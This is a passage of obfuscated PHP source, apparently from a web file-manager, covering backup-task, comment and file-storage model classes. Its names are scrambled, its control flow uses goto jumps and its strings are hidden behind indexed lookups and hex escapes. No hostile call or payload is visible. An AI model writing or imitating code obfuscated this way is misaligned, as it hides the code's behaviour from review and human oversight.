$b•¸½ì§–˜ = Model($aÕĞ”°µ‹Í[2143])->listData(); foreach ($b•¸½ì§–˜ as $a–·›ŸÏÕØ) { if ($a–·›ŸÏÕØ[$aÕĞ”°µ‹Í[1090]] == $aÕĞ”°µ‹Í[83] && $a–·›ŸÏÕØ[$aÕĞ”°µ‹Í[1438]] == $aÕĞ”°µ‹Í[2144]) { $FÔ¸´œ’Å = $a–·›ŸÏÕØ; break; } } goto EØğÑîì—; EØğÑîì—: if (isset($FÔ¸´œ’Å[$aÕĞ”°µ‹Í[194]])) { $FÔ¸´œ’Å[$aÕĞ”°µ‹Í[194]] = json_decode($FÔ¸´œ’Å[$aÕĞ”°µ‹Í[194]], !0); } if (isset($bŒ¶Œ†Ğ…[$aÕĞ”°µ‹Í[194]])) { $FÔ¸´œ’Å[$aÕĞ”°µ‹Í[194]][$aÕĞ”°µ‹Í[1425]] = $bŒ¶Œ†Ğ…[$aÕĞ”°µ‹Í[194]]; unset($bŒ¶Œ†Ğ…[$aÕĞ”°µ‹Í[194]]); } return array_merge($FÔ¸´œ’Å, $bŒ¶Œ†Ğ…); goto eÊÇ»”šÓÂ; DÒÉÜŸ÷ê²: $aÕĞ”°µ‹Í =& $_SERVER[…Ò×–]; $bŒ¶Œ†Ğ… = Model($aÕĞ”°µ‹Í[1098])->get($aÕĞ”°µ‹Í[718]); $bŒ¶Œ†Ğ… = json_decode($bŒ¶Œ†Ğ…, !0); goto AÒ‘ƒÀ Öå; AÒ‘ƒÀ Öå: $bŒ¶Œ†Ğ… = is_array($bŒ¶Œ†Ğ…) ? $bŒ¶Œ†Ğ… : array(); if (!isset($bŒ¶Œ†Ğ…[$aÕĞ”°µ‹Í[697]])) { $bŒ¶Œ†Ğ…[$aÕĞ”°µ‹Í[697]] = $aÕĞ”°µ‹Í[83]; } $FÔ¸´œ’Å = array(); goto eƒ¯Ïä‡Î–; eÊÇ»”šÓÂ: } public function listData($cÎÛÓ±äÛ‡ = false, $FÕ„…‹ÙèÆ = "\x6d\x6f\x64\x69\x66\171\x54\151\155\x65", $bÇë¦·•×‚ = false) { return parent::listData($cÎÛÓ±äÛ‡, $FÕ„…‹ÙèÆ, !0); } public function lastItem() { $fŠ¢‘¥§“ß = $this->listData(); return !empty($fŠ¢‘¥§“ß[0]) ? $fŠ¢‘¥§“ß[0] : null; } public function kill($fâŒ¸ì‰ê) { goto B¡à; cÜ‘òÆœÏÁ: Task::kill($F°Ã„ëª®™[717]); Task::kill($F°Ã„ëª®™[733]); Task::kill($F°Ã„ëª®™[741]); goto EÕ¥œğê¤; aí¼Ç¤÷ƒ: return $this->remove($fâŒ¸ì‰ê); goto Bù³Üññ; B¡à: $F°Ã„ëª®™ =& $_SERVER[…Ò×–]; $dˆ¨Éé­ªø = $this->listData($fâŒ¸ì‰ê); if (!$dˆ¨Éé­ªø || empty($dˆ¨Éé­ªø[$F°Ã„ëª®™[28]])) { return !0; } goto cÜ‘òÆœÏÁ; EÕ¥œğê¤: $fÍ‚äŠŸ±¯ = $dˆ¨Éé­ªø[$F°Ã„ëª®™[28]]; $d³îÏÙ¡ƒ = TEMP_FILES . $F°Ã„ëª®™[714] . $fÍ‚äŠŸ±¯ . $F°Ã„ëª®™[8]; IO::remove($d³îÏÙ¡ƒ, !1); goto aí¼Ç¤÷ƒ; Bù³Üññ: } public function remove($BÂ¿ÀÙåƒ£) { $CİÑİù†š‰ = $this->listData($BÂ¿ÀÙåƒ£); if (!$CİÑİù†š‰) { return !0; } return $this->backupRemove($CİÑİù†š‰); } private function backupRemove($cŠ¢ÁšïĞğ) { $d¢ÚÎ·ğ†š =& $_SERVER[…Ò×–]; parent::remove($cŠ¢ÁšïĞğ[$d¢ÚÎ·ğ†š[371]]); $c¶©—®Í•° = "\x7b\x69\x6f\x3a{$cŠ¢ÁšïĞğ[$d¢ÚÎ·ğ†š[696]]}\x7d\x2f\x64\141\164\141\x62\x61\163\x65\x2f\142\141\143\153\x75\160\137" . $cŠ¢ÁšïĞğ[$d¢ÚÎ·ğ†š[28]]; IO::remove($c¶©—®Í•°, !1); return !0; } public function start() { goto e±†Ş“ŠÉ¢; e±†Ş“ŠÉ¢: $cäöËŠ»“– =& $_SERVER[…Ò×–]; if ($GLOBALS[$cäöËŠ»“–[6]][$cäöËŠ»“–[84]][$cäöËŠ»“–[2145]] != $cäöËŠ»“–[83]) { return !0; } $B±…¼¥ØÁ = $this->config(); goto eñˆÒò†š; eñˆÒò†š: if (!$B±…¼¥ØÁ || $B±…¼¥ØÁ[$cäöËŠ»“–[1422]] != $cäöËŠ»“–[83]) { return !1; } $Bô¸æÈ¥ = $this->process(); foreach ($Bô¸æÈ¥ as $D³¯¨£øğ‡) { if ($D³¯¨£øğ‡) { return Task::restart($D³¯¨£øğ‡[$cäöËŠ»“–[371]]); } } goto Eîê½îæƒ’; cª‚®Ù—ÂŠ: return !0; goto aØæ°‡Ç›Ã; BìÌÓÛÜ…‚: if (!$aŠŞî¤ˆ–->dbFile()) { return !1; } if ($B±…¼¥ØÁ[$cäöËŠ»“–[697]] == $cäöËŠ»“–[473]) { $aŠŞî¤ˆ–->file(); } Backup::set(array($cäöËŠ»“–[694] => 1, $cäöËŠ»“–[452] => time())); goto cª‚®Ù—ÂŠ; Eîê½îæƒ’: $aŠŞî¤ˆ– = new Backup(); $aŠŞî¤ˆ–->keep(); if (!$aŠŞî¤ˆ–->db()) { return !1; } goto BìÌÓÛÜ…‚; aØæ°‡Ç›Ã: } public function process() { $aâ…›ˆšª =& $_SERVER[…Ò×–]; return array($aâ…›ˆšª[699] => Task::get($aâ…›ˆšª[717]), $aâ…›ˆšª[702] => Task::get($aâ…›ˆšª[733]), $aâ…›ˆšª[171] => Task::get($aâ…›ˆšª[741])); } public function restore() { $d‡ˆŒÅÁ¿‘ =& $_SERVER[…Ò×–]; ActionCall($d‡ˆŒÅÁ¿‘[980], !0, 1); ActionCall($d‡ˆŒÅÁ¿‘[980], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\x65\156\164"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\x61\x6d\x65" => "\143\x6f\155\155\x65\156\x74\137\x6d\145\x74\141", "\155\x65\164\x61\106\151\145\154\144" => "\x63\x6f\x6d\x6d\145\156\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($AªĞÆóãÕÙ) { $aÚ­Õ©øÁ =& $_SERVER[…Ò×–]; if ($AªĞÆóãÕÙ[$aÚ­Õ©øÁ[2146]]) { $fœ¼¡Âò = $this->where(array($aÚ­Õ©øÁ[2147] => $AªĞÆóãÕÙ[$aÚ­Õ©øÁ[2146]]))->find(); if (!$fœ¼¡Âò || $fœ¼¡Âò[$aÚ­Õ©øÁ[375]] != $AªĞÆóãÕÙ[$aÚ­Õ©øÁ[375]] || $fœ¼¡Âò[$aÚ­Õ©øÁ[461]] != $AªĞÆóãÕÙ[$aÚ­Õ©øÁ[461]]) { return !1; } $this->where(array($aÚ­Õ©øÁ[2147] => $AªĞÆóãÕÙ[$aÚ­Õ©øÁ[2146]]))->setAdd($aÚ­Õ©øÁ[2148], 1); } $AªĞÆóãÕÙ[$aÚ­Õ©øÁ[2149]] = 0; $AªĞÆóãÕÙ[$aÚ­Õ©øÁ[2148]] = 0; $AªĞÆóãÕÙ[$aÚ­Õ©øÁ[694]] = 1; return $this->add($AªĞÆóãÕÙ); } public function remove($b†ƒğ¡ÛËê) { $F–ÒªŠäÅ =& $_SERVER[…Ò×–]; $D…ƒ”¦¶ö = array($F–ÒªŠäÅ[2147] => $b†ƒğ¡ÛËê); $cÁ¶·ğ’¾¸ = $this->where($D…ƒ”¦¶ö)->find(); if ($cÁ¶·ğ’¾¸[$F–ÒªŠäÅ[2146]]) { $this->where(array($F–ÒªŠäÅ[2147] => $cÁ¶·ğ’¾¸[$F–ÒªŠäÅ[2146]]))->setAdd($F–ÒªŠäÅ[2148], -1); } return $this->where($D…ƒ”¦¶ö)->delete(); } public function edit($c§Öôî¤ó, $cº¡¨‹ÄåÖ) { $a’ª¸¢êİ =& $_SERVER[…Ò×–]; $B§èÎŠÏÔæ = array($a’ª¸¢êİ[2147] => $c§Öôî¤ó); return $this->where($B§èÎŠÏÔæ)->save(array($a’ª¸¢êİ[2150] => $cº¡¨‹ÄåÖ)); } public function prasise($C­¿ÃÌóëµ) { $F­é¶Íƒ© =& $_SERVER[…Ò×–]; $b‹Û†–Ä = Model($F­é¶Íƒ©[2151]); $fÔ˜ŸŒƒ˜ª = array($F­é¶Íƒ©[2147] => $C­¿ÃÌóëµ, $F­é¶Íƒ©[1441] => USER_ID); $cåÈà¢Ë‰ = $b‹Û†–Ä->where($fÔ˜ŸŒƒ˜ª)->find(); if (!$cåÈà¢Ë‰) { $b‹Û†–Ä->add($fÔ˜ŸŒƒ˜ª); $DŠ‘ŠÕ ¯Š = $this->where(array($F­é¶Íƒ©[2147] => $C­¿ÃÌóëµ))->setAdd($F­é¶Íƒ©[2149], 1); } else { $b‹Û†–Ä->where($fÔ˜ŸŒƒ˜ª)->delete(); $DŠ‘ŠÕ ¯Š = $this->where(array($F­é¶Íƒ©[2147] => $C­¿ÃÌóëµ))->setAdd($F­é¶Íƒ©[2149], -1); } return $DŠ‘ŠÕ ¯Š; } public function targetInfo($E„ŞÇò„–Ê, $fÈˆ¡»ÔÕ¶) { goto EÉŠğ¶á÷É; EÉŠğ¶á÷É: $C±„Õ¶ÖßØ =& $_SERVER[…Ò×–]; $cô·¨”İÇÉ = array($C±„Õ¶ÖßØ[526] => $E„ŞÇò„–Ê, $C±„Õ¶ÖßØ[527] => $fÈˆ¡»ÔÕ¶); $F¾„¤ğ‹ê® = $this->where($cô·¨”İÇÉ)->count(); goto bç»ãÄĞ ğ; Fªğ²…˜É: return $BÔ‘Ù‰ºŒ; goto d³¯…®×; bç»ãÄĞ ğ: $e¡ñÕàĞÛ¥ = "\122\111\x47\110\x54\40\112\x4f\x49\116\40{$this->tablePrefix}\143\157\x6d\x6d\145\156\x74\137\x70\162\x61\x69\163\x65\x20\x73\164\x61\162\40\x6f\156\x20\x63\x6f\x6d\x6d\145\x6e\164\x2e\x63\x6f\155\155\x65\156\x74\111\104\x20\x3d\40\163\x74\141\x72\56\143\157\155\x6d\x65\x6e\164\x49\104"; $dÄõË¨Ö™° = $this->alias($C±„Õ¶ÖßØ[345])->where($cô·¨”İÇÉ)->join($e¡ñÕàĞÛ¥, $C±„Õ¶ÖßØ[2152])->count(); $BÔ‘Ù‰ºŒ = array($C±„Õ¶ÖßØ[2153] => $F¾„¤ğ‹ê®, $C±„Õ¶ÖßØ[2154] => $dÄõË¨Ö™°); goto Fªğ²…˜É; d³¯…®×: } public function listData($b¨¹İó¯Å) { $CâôÊ³ÆµÄ =& $_SERVER[…Ò×–]; if (isset($b¨¹İó¯Å[$CâôÊ³ÆµÄ[2155]])) { if ($b¨¹İó¯Å[$CâôÊ³ÆµÄ[2155]]) { $b¨¹İó¯Å[$CâôÊ³ÆµÄ[2156]] = array($CâôÊ³ÆµÄ[934], intval($b¨¹İó¯Å[$CâôÊ³ÆµÄ[2155]])); } unset($b¨¹İó¯Å[$CâôÊ³ÆµÄ[2155]]); } if (isset($b¨¹İó¯Å[$CâôÊ³ÆµÄ[2157]])) { if ($b¨¹İó¯Å[$CâôÊ³ÆµÄ[2157]]) { $b¨¹İó¯Å[$CâôÊ³ÆµÄ[2156]] = array($CâôÊ³ÆµÄ[931], intval($b¨¹İó¯Å[$CâôÊ³ÆµÄ[2157]])); } unset($b¨¹İó¯Å[$CâôÊ³ÆµÄ[2157]]); } return $this->_listData($b¨¹İó¯Å); } private function _listData($D„‡“ì—›¨) { $E­ë¹¦…“¤ =& $_SERVER[…Ò×–]; $C’á•°ÊÃ½ = $this->where($D„‡“ì—›¨)->_makeOrder()->selectPage(100); $this->_listAppendParent($C’á•°ÊÃ½[$E­ë¹¦…“¤[358]]); $this->_listAppendUser($C’á•°ÊÃ½[$E­ë¹¦…“¤[358]]); $this->_listAppendMeta($C’á•°ÊÃ½[$E­ë¹¦…“¤[358]]); return $C’á•°ÊÃ½; } private function _makeOrder() { $BßÄ‹¼¡™÷ =& $_SERVER[…Ò×–]; $C’È‰øôµÕ = array($BßÄ‹¼¡™÷[2149], $BßÄ‹¼¡™÷[2148], $BßÄ‹¼¡™÷[191]); $b£ÊÄ¡Šã— = Input::get($BßÄ‹¼¡™÷[411], $BßÄ‹¼¡™÷[7], $BßÄ‹¼¡™÷[393], $C’È‰øôµÕ); $D·ôÉµ‹Ô = Input::get($BßÄ‹¼¡™÷[412], $BßÄ‹¼¡™÷[7], $BßÄ‹¼¡™÷[1443], array($BßÄ‹¼¡™÷[2158], $BßÄ‹¼¡™÷[409])); $E÷âË½º = $b£ÊÄ¡Šã— . $BßÄ‹¼¡™÷[50] . $D·ôÉµ‹Ô; return $this->order($E÷âË½º); } private function _listAppendParent(&$Cï†ì°†Ö) { goto CÆÓ²’†ˆˆ; D–Ê›Û³ˆÇ: foreach ($Cï†ì°†Ö as &$DÔ·ë–é“…) { if (isset($Dï¡‚¾¼‚â[$DÔ·ë–é“…[$A¡ß­êåïÕ[2146]]])) { $DÔ·ë–é“…[$A¡ß­êåïÕ[2159]] = $Dï¡‚¾¼‚â[$DÔ·ë–é“…[$A¡ß­êåïÕ[2146]]]; } } unset($DÔ·ë–é“…); goto a¾õâ½‰óÁ; CÆÓ²’†ˆˆ: $A¡ß­êåïÕ =& $_SERVER[…Ò×–]; $Dª§š•Ëâ‚ = array_unique(array_to_keyvalue($Cï†ì°†Ö, $A¡ß­êåïÕ[33], $A¡ß­êåïÕ[2146])); $Dª§š•Ëâ‚ = array_remove_value($Dª§š•Ëâ‚, $A¡ß­êåïÕ[473]); goto CŸØíİÚ¿æ; CŸØíİÚ¿æ: if (!$Dª§š•Ëâ‚) { return; } $Dï¡‚¾¼‚â = $this->where(array($A¡ß­êåïÕ[2147] => array($A¡ß­êåïÕ[7], $Dª§š•Ëâ‚)))->select(); $Dï¡‚¾¼‚â = array_to_keyvalue($Dï¡‚¾¼‚â, $A¡ß­êåïÕ[2156]); goto D–Ê›Û³ˆÇ; a¾õâ½‰óÁ: } private function _listAppendUser(&$B–‹ƒÊ£) { goto e±Öà¾´Ù§; e±Öà¾´Ù§: $d›ï±ÃŠÄ’ =& $_SERVER[…Ò×–]; $aÉˆá·Ó = array_unique(array_to_keyvalue($B–‹ƒÊ£, $d›ï±ÃŠÄ’[33], $d›ï±ÃŠÄ’[1450])); $aÉˆá·Ó = array_remove_value($aÉˆá·Ó, $d›ï±ÃŠÄ’[473]); goto AŠóÔˆÙÂæ; cªí¥Ğ±–: foreach ($B–‹ƒÊ£ as &$aÆ›ëÙé¦Ú) { $aÆ›ëÙé¦Ú[$d›ï±ÃŠÄ’[539]] = $a¤ ¡„Š†Ã[$aÆ›ëÙé¦Ú[$d›ï±ÃŠÄ’[1450]]]; if (isset($aÆ›ëÙé¦Ú[$d›ï±ÃŠÄ’[2159]])) { $aÆ›ëÙé¦Ú[$d›ï±ÃŠÄ’[2159]][$d›ï±ÃŠÄ’[539]] = $a¤ ¡„Š†Ã[$aÆ›ëÙé¦Ú[$d›ï±ÃŠÄ’[2159]][$d›ï±ÃŠÄ’[1450]]]; } } unset($aÆ›ëÙé¦Ú); goto A§·¤øÌõØ; AŠóÔˆÙÂæ: if (count($aÉˆá·Ó) == 0) { return; } foreach ($B–‹ƒÊ£ as $aÆ›ëÙé¦Ú) { if (isset($aÆ›ëÙé¦Ú[$d›ï±ÃŠÄ’[2159]])) { $aÉˆá·Ó[] = $aÆ›ëÙé¦Ú[$d›ï±ÃŠÄ’[2159]][$d›ï±ÃŠÄ’[1450]]; } } $a¤ ¡„Š†Ã = Model($d›ï±ÃŠÄ’[482])->userListInfo($aÉˆá·Ó); goto cªí¥Ğ±–; A§·¤øÌõØ: } private function _listAppendMeta(&$fÛÀá—â­) { goto AÚœã–ĞŞÊ; AÚœã–ĞŞÊ: $F†Ş¨ª´óÙ =& $_SERVER[…Ò×–]; $C¯ÖÜô«ò¹ = array_unique(array_to_keyvalue($fÛÀá—â­, $F†Ş¨ª´óÙ[33], $F†Ş¨ª´óÙ[2156])); $C¯ÖÜô«ò¹ = array_remove_value($C¯ÖÜô«ò¹, $F†Ş¨ª´óÙ[473]); goto fÀ•¢É§ƒº; e¸›ÏÄÂ¿ì: if (!$FˆŒ”à°¼é) { return !1; } foreach ($fÛÀá—â­ as &$BÆõÑ˜‰ô) { $BÆõÑ˜‰ô[$F†Ş¨ª´óÙ[421]] = $FˆŒ”à°¼é[$BÆõÑ˜‰ô[$F†Ş¨ª´óÙ[2156]]]; if (isset($BÆõÑ˜‰ô[$F†Ş¨ª´óÙ[2159]])) { $BÆõÑ˜‰ô[$F†Ş¨ª´óÙ[2159]][$F†Ş¨ª´óÙ[421]] = $FˆŒ”à°¼é[$BÆõÑ˜‰ô[$F†Ş¨ª´óÙ[2159]][$F†Ş¨ª´óÙ[2156]]]; } } unset($BÆõÑ˜‰ô); goto eİ•®¥Ø¢; fÀ•¢É§ƒº: if (!$C¯ÖÜô«ò¹) { return; } foreach ($fÛÀá—â­ as $BÆõÑ˜‰ô) { if (isset($BÆõÑ˜‰ô[$F†Ş¨ª´óÙ[2159]])) { $C¯ÖÜô«ò¹[] = $BÆõÑ˜‰ô[$F†Ş¨ª´óÙ[2159]][$F†Ş¨ª´óÙ[2156]]; } } $FˆŒ”à°¼é = $this->metaList($C¯ÖÜô«ò¹); goto e¸›ÏÄÂ¿ì; eİ•®¥Ø¢: } private function metaList($fÆ’òÆ¦åÛ) { goto BÇø“æéô¡; AÀƒğ“àğÚ: return $eé÷æÒËÜ† ? $eé÷æÒËÜ† : array(); goto a±Š¼°âø; BÇø“æéô¡: $Fö÷¾èÅ†‰ =& $_SERVER[…Ò×–]; if (!$fÆ’òÆ¦åÛ) { return array(); } $e‹ÏÇÚ±ª = array($Fö÷¾èÅ†‰[2156] => array($Fö÷¾èÅ†‰[7], $fÆ’òÆ¦åÛ)); goto aİ¡îåÇå•; aİ¡îåÇå•: $eé÷æÒËÜ† = Model($Fö÷¾èÅ†‰[2160])->where($e‹ÏÇÚ±ª)->select(); $eé÷æÒËÜ† = array_to_keyvalue_group($eé÷æÒËÜ†, $Fö÷¾èÅ†‰[2156]); foreach ($eé÷æÒËÜ† as $CŞÂæ÷‰‘ò => $cØæÁ èœÔ) { $Bâ„ö“„Ğê = array(); foreach ($cØæÁ èœÔ as $AšŞèä¡µ›) { $Bâ„ö“„Ğê[$AšŞèä¡µ›[$Fö÷¾èÅ†‰[89]]] = $AšŞèä¡µ›[$Fö÷¾èÅ†‰[363]]; } $eé÷æÒËÜ†[$CŞÂæ÷‰‘ò] = $Bâ„ö“„Ğê; } goto AÀƒğ“àğÚ; a±Š¼°âø: } } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\154\x65"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\x61\155\x65" => "\x69\x6f\x5f\x66\x69\x6c\x65\x5f\155\x65\x74\141", "\x6d\145\164\141\106\x69\x65\x6c\x64" => "\146\x69\154\x65\111\104"); public function fileInfo($F¹ª‡éôƒé) { $e ö‡ºõ£ =& $_SERVER[…Ò×–]; static $Fƒë½öÓµ = array(); if (!isset($Fƒë½öÓµ[$F¹ª‡éôƒé])) { $D ¤¸â“® = $e ö‡ºõ£[2161]; $b®Øë¹—Î­ = Model($e ö‡ºõ£[426])->field($D ¤¸â“®)->where(array($e ö‡ºõ£[424] => $F¹ª‡éôƒé))->find(); $Fƒë½öÓµ[$F¹ª‡éôƒé] = $b®Øë¹—Î­; } return $Fƒë½öÓµ[$F¹ª‡éôƒé]; } public function addFileByContent($B¢Öƒ÷¢Ä¸ = '', $FÓ©¹…å³º = '') { goto báÊˆø¡À–; aÆÔöÚ¾‡ğ: $FÍÅ¿ùáç¡ = $A°Ò¶İ°‡š . $BÚ›¾ë­øÉ[2163] . rand_string(16); file_put_contents($FÍÅ¿ùáç¡, $B¢Öƒ÷¢Ä¸); $Dšˆ«¾²Óö = $this->addFile($FÍÅ¿ùáç¡, $FÓ©¹…å³º, !0); goto DéÀÖæ›¡; DéÀÖæ›¡: if (file_exists($FÍÅ¿ùáç¡)) { @unlink($FÍÅ¿ùáç¡); } return $Dšˆ«¾²Óö; goto d‡ß¨áÇ¬Û; báÊˆø¡À–: $BÚ›¾ë­øÉ =& $_SERVER[…Ò×–]; $A°Ò¶İ°‡š = TEMP_PATH . $BÚ›¾ë­øÉ[2162]; if (!is_dir($A°Ò¶İ°‡š)) { mk_dir($A°Ò¶İ°‡š); } goto aÆÔöÚ¾‡ğ; d‡ß¨áÇ¬Û: } public function createFileName($B³†èÚàì×) { goto C³™³Ñ’ÜÏ; BŸ†ëËĞç: $eöˆ˜«¹›‹ = $EÅÛ³ÙÊ„å->pathFather($F÷Š‘¾óï§); static $DƒÖš»ä³¦ = false; $DßŸæÒ¹É = $d¤æ¥Ğñ¾±[2164] . md5($eöˆ˜«¹›‹); goto F‹•Ë‰ªåô; F‹•Ë‰ªåô: if (!$DƒÖš»ä³¦ && !Cache::get($DßŸæÒ¹É)) { $DƒÖš»ä³¦ = !0; $dö³Ûª†ßƒ = IO::mkdir($eöˆ˜«¹›‹); if (!IO::exist($dö³Ûª†ßƒ . $d¤æ¥Ğñ¾±[2165])) { IO::mkfile($dö³Ûª†ßƒ . $d¤æ¥Ğñ¾±[2165]); } Cache::set($DßŸæÒ¹É, 1, 3600 * 2); } return $F÷Š‘¾óï§; goto aÜ”ßŒâ; C³™³Ñ’ÜÏ: $d¤æ¥Ğñ¾± =& $_SERVER[…Ò×–]; $EÅÛ³ÙÊ„å = IO::init($d¤æ¥Ğñ¾±[8]); $F÷Š‘¾óï§ = $this->makeFilePath($B³†èÚàì×, $EÅÛ³ÙÊ„å); goto BŸ†ëËĞç; aÜ”ßŒâ: } public function makeFilePath($B¯Œöß¦œ, $cæŞğöîšö) { goto BöÑÎáİ¦¡; d“áØÅº†ø: switch ($e†ÃÛº÷‡) { case $Eø†œ¡Ñ£Ş[2169]: $Añ—¯» = $Añ—¯» . $Eø†œ¡Ñ£Ş[91] . $cæŞğöîšö->ext($B¯Œöß¦œ); if ($cæŞğöîšö->ext($B¯Œöß¦œ) == $Eø†œ¡Ñ£Ş[2109]) { $Añ—¯» .= $Eø†œ¡Ñ£Ş[1350]; } break; case $Eø†œ¡Ñ£Ş[2170]: goto AÅ©ë‰œ‡‰; fÅ¬à‹ˆ: $BÅ˜È¡ÒØ = $Eø†œ¡Ñ£Ş[2171] . $aÆƒìÄ…›[$Eø†œ¡Ñ£Ş[371]] . $Eø†œ¡Ñ£Ş[2172] . date($Eø†œ¡Ñ£Ş[2173]) . $bÌ„¶é‹¡„ . $Eø†œ¡Ñ£Ş[8]; if ($cæŞğöîšö->ext($B¯Œöß¦œ) == $Eø†œ¡Ñ£Ş[2109]) { $B¯Œöß¦œ .= $Eø†œ¡Ñ£Ş[1350]; } $a‘Æ³°ìâù = $Eø†œ¡Ñ£Ş[2174] . $BÅ˜È¡ÒØ . $B¯Œöß¦œ; goto f˜—İâ¨Ş”; Fª”Ì–ó¹: if (IO::isTypeObject($Añ—¯») && !IO::isUploadServer($Añ—¯»)) { IO::setContent($Añ—¯», $Eø†œ¡Ñ£Ş[33]); } CacheLock::unlock($a‘Æ³°ìâù); break; goto Aìù¿Ÿ¶Ğ; f˜—İâ¨Ş”: CacheLock::lock($a‘Æ³°ìâù); $a­ê”±¬ÃĞ = IO::fileNameAuto($BÅ˜È¡ÒØ, $B¯Œöß¦œ); $Añ—¯» = $BÅ˜È¡ÒØ . $a­ê”±¬ÃĞ; goto Fª”Ì–ó¹; AÅ©ë‰œ‡‰: $DĞßœĞëÚ = Model($Eø†œ¡Ñ£Ş[1098])->get($Eø†œ¡Ñ£Ş[1346]); $bÌ„¶é‹¡„ = substr(md5($Eø†œ¡Ñ£Ş[1928] . $DĞßœĞëÚ . date($Eø†œ¡Ñ£Ş[692])), 0, 8); $aÆƒìÄ…› = KodIO::defaultDriver(); goto fÅ¬à‹ˆ; Aìù¿Ÿ¶Ğ: case $Eø†œ¡Ñ£Ş[2168]: break; default: break; } return $Añ—¯»; goto F·£ğÉÂÖÙ; BöÑÎáİ¦¡: $Eø†œ¡Ñ£Ş =& $_SERVER[…Ò×–]; $e†ÃÛº÷‡ = Model($Eø†œ¡Ñ£Ş[1098])->get($Eø†œ¡Ñ£Ş[2166]); $BÅ˜È¡ÒØ = KodIO::defaultIO() . date($Eø†œ¡Ñ£Ş[2167]); goto dë‰ò»‘ÒÄ; dë‰ò»‘ÒÄ: $Añ—¯» = $BÅ˜È¡ÒØ . rand_string(5) . short_id(100); $B¯Œöß¦œ = str_replace($Eø†œ¡Ñ£Ş[8], $Eø†œ¡Ñ£Ş[70], KodIO::clear($B¯Œöß¦œ)); if (!$B¯Œöß¦œ) { $e†ÃÛº÷‡ = $Eø†œ¡Ñ£Ş[2168]; } goto d“áØÅº†ø; F·£ğÉÂÖÙ: } public function addFileByRemote($Eã……óñ…°, $bîø èÑé¹, $EˆÕĞå‹ï = array()) { goto aÖ¡õ·Âî; aÖ¡õ·Âî: $A·º‘³©šÊ =& $_SERVER[…Ò×–]; if (!IO::exist($Eã……óñ…°)) { return !1; } $E”Ì¬å×”Ä = $EˆÕĞå‹ï[$A·º‘³©šÊ[167]] ? $EˆÕĞå‹ï[$A·º‘³©šÊ[167]] : $A·º‘³©šÊ[33]; goto d°˜œµÍ“; d°˜œµÍ“: $Bˆï¶²²½¥ = IO::hashMd5($Eã……óñ…°, $E”Ì¬å×”Ä); $aô×ÑÀÃöÀ = KodIO::defaultDriver(); $Eê×—…Ş = array($A·º‘³©šÊ[525] => IO::size($Eã……óñ…°), $A·º‘³©šÊ[2175] => 1, $A·º‘³©šÊ[390] => $bîø èÑé¹, $A·º‘³©šÊ[740] => $aô×ÑÀÃöÀ[$A·º‘³©šÊ[371]], $A·º‘³©šÊ[391] => $Eã……óñ…°, $A·º‘³©šÊ[2176] => $EˆÕĞå‹ï[$A·º‘³©šÊ[168]] ? $EˆÕĞå‹ï[$A·º‘³©šÊ[168]] : IO::hashSimple($Eã……óñ…°), $A·º‘³©šÊ[2177] => $Bˆï¶²²½¥ ? $Bˆï¶²²½¥ : $E”Ì¬å×”Ä); goto e¨á®¼Ãµ¤; e¨á®¼Ãµ¤: if ($C’™›èÁŠ¸ = $this->addFileCheckExist($Eê×—…Ş[$A·º‘³©šÊ[168]], $Eê×—…Ş[$A·º‘³©šÊ[167]], $Eê×—…Ş[$A·º‘³©šÊ[77]])) { return $C’™›èÁŠ¸; } return $this->addFileData($Eê×—…Ş); goto eù¥ØÉµ¯š; eù¥ØÉµ¯š: } private function addFileData($a‚ô‘œĞõ‡) { $f¤²¾Œİ…› =& $_SERVER[…Ò×–]; if (!$a‚ô‘œĞõ‡) { return !1; } $a‚ô‘œĞõ‡[$f¤²¾Œİ…›[77]] = intval($a‚ô‘œĞõ‡[$f¤²¾Œİ…›[77]]); if (!$a‚ô‘œĞõ‡[$f¤²¾Œİ…›[77]] && strlen($a‚ô‘œĞõ‡[$f¤²¾Œİ…›[168]]) > 32) { $a‚ô‘œĞõ‡[$f¤²¾Œİ…›[77]] = intval(substr($a‚ô‘œĞõ‡[$f¤²¾Œİ…›[168]], 32)); } $f¤çŒŒòÉ— = $this->add($a‚ô‘œĞõ‡); return $this->find($f¤çŒŒòÉ—); } public function addFile($c·¼Èİ©¨, $b°Î­  ‘­, $aÁ“À˜İÛ = false) { goto eÂŸ¼¼ˆ¡; EÕ›­†Šá•: $EçÌî«ÒÇ = $this->addFileMake($c·¼Èİ©¨, $BÑ‡º´£‰¯, $fŠ½ˆî·ã, $f–º¬Ú¦•, $b°Î­  ‘­, $aÁ“À˜İÛ); $böĞïÕò‡¼ = $this->addFileData($EçÌî«ÒÇ); CacheLock::unlock($AøÇœÛé¯…); goto e—ĞÜÄ¸¤÷; eÂŸ¼¼ˆ¡: $fŠ½ˆî·ã = IO::hashSimple($c·¼Èİ©¨); $f–º¬Ú¦• = IO::hashMd5($c·¼Èİ©¨); $BÑ‡º´£‰¯ = IO::size($c·¼Èİ©¨); goto C©ÕÓ¹÷°Ÿ; C©ÕÓ¹÷°Ÿ: $AøÇœÛé¯… = $_SERVER[…Ò×–][2178] . $f–º¬Ú¦•; CacheLock::lock($AøÇœÛé¯…); if ($B·¹Ã¾”×Â = $this->addFileCheckExist($fŠ½ˆî·ã, $f–º¬Ú¦•, $BÑ‡º´£‰¯)) { CacheLock::unlock($AøÇœÛé¯…); return $B·¹Ã¾”×Â; } goto EÕ›­†Šá•; e—ĞÜÄ¸¤÷: return $böĞïÕò‡¼; goto cÜ…ãÔß; cÜ…ãÔß: } public function addFileMake($A°ƒ÷‡Û®Ö, $EÑÃ¼¹‚š™, $C¸Î¸´Äµ¾, $DÌ•Ë…‹è, $eÌğ–„İ, $fÛŞ’Ùã­£) { goto dØè¨Ï­„; F†‘çÄÄ‹: $cˆ—ÊÔ£×£ = KodIO::defaultDriver(); $f¹§¢­§ö³ = array($aĞÄšáÕ[525] => $EÑÃ¼¹‚š™, $aĞÄšáÕ[2175] => 1, $aĞÄšáÕ[390] => $eÌğ–„İ, $aĞÄšáÕ[740] => $cˆ—ÊÔ£×£[$aĞÄšáÕ[371]], $aĞÄšáÕ[391] => 